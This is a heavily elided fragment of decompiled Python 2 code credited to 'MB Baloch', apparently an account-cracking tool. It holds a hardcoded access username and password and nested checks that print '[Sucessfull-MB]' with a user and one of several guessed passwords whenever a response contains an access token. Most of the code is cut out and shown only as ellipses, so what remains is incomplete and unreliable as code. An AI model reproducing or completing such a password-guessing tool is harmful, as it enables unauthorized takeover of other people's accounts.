...
# Decompiled By MB Baloch

# Youtube : https://youtube.com/channel/UC67mh3aIKRCqxcVjeRKlrfA

# uncompyle6 version 

# Original written By MB Baloch

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

__author__ = 'MB BALOCH'

CorrectUsername = 'Baloch'

CorrectPassword = 'Baloch123'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[92m  [Sucessfull-MB]  ' + k + c + user + '  |  ' + pass1
                ...
                print '\x1b[1;91m  [Sucessfull-MB] ' + k + c + user + '  |  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;92m  [Sucessfull-MB] ' + k + c + user + '  |  ' + pass2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m  [Sucessfull-MB]  ' + k + c + user + '  |  ' + pass3
